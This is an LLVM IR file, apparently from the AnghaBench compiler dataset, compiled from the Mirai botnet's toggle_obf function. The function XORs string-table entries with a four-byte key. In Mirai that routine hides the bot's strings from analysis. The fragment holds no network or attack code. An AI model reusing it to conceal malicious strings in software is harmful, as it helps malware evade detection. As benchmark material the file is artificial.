; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_table.c_toggle_obf.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_table.c_toggle_obf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.table_value = type { i32, i64*, i32 }

@table = common dso_local global %struct.table_value* null, align 8
@table_key = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i64)* @toggle_obf to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @toggle_obf(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  store i64 %0, i64* %2, align 8
  %9 = load %struct.table_value*, %struct.table_value** @table, align 8
  %10 = load i64, i64* %2, align 8
  %11 = getelementptr inbounds %struct.table_value, %struct.table_value* %9, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %5, align 8
  %15 = load i32, i32* @table_key, align 4
  %16 = ashr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = sext i32 %17 to i64
  store i64 %18, i64* %6, align 8
  %19 = load i32, i32* @table_key, align 4
  %20 = ashr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %7, align 8
  %23 = load i32, i32* @table_key, align 4
  %24 = ashr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %8, align 8
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %70, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 0
  %31 = load i32, i32* %30, align 8
  %32 = icmp slt i32 %28, %31
  br i1 %32, label %33, label %73

33:                                               ; preds = %27
  %34 = load i64, i64* %5, align 8
  %35 = load %struct.table_value*, %struct.table_value** %4, align 8
  %36 = getelementptr inbounds %struct.table_value, %struct.table_value* %35, i32 0, i32 1
  %37 = load i64*, i64** %36, align 8
  %38 = load i32, i32* %3, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i64, i64* %37, i64 %39
  %41 = load i64, i64* %40, align 8
  %42 = xor i64 %41, %34
  store i64 %42, i64* %40, align 8
  %43 = load i64, i64* %6, align 8
  %44 = load %struct.table_value*, %struct.table_value** %4, align 8
  %45 = getelementptr inbounds %struct.table_value, %struct.table_value* %44, i32 0, i32 1
  %46 = load i64*, i64** %45, align 8
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i64, i64* %46, i64 %48
  %50 = load i64, i64* %49, align 8
  %51 = xor i64 %50, %43
  store i64 %51, i64* %49, align 8
  %52 = load i64, i64* %7, align 8
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i64*, i64** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i64, i64* %55, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = xor i64 %59, %52
  store i64 %60, i64* %58, align 8
  %61 = load i64, i64* %8, align 8
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 1
  %64 = load i64*, i64** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i64, i64* %64, i64 %66
  %68 = load i64, i64* %67, align 8
  %69 = xor i64 %68, %61
  store i64 %69, i64* %67, align 8
  br label %70

70:                                               ; preds = %33
  %71 = load i32, i32* %3, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %3, align 4
  br label %27

73:                                               ; preds = %27
  ret void
}

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
